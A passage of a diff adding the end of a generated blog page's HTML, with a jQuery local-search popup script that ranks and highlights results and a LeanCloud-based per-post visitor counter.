+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("8wOk9HbIqBDNUsLGdbL0MWAi-gzGzoHsz", "v5hhFJSgXiR9cMIticcsH1tt");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
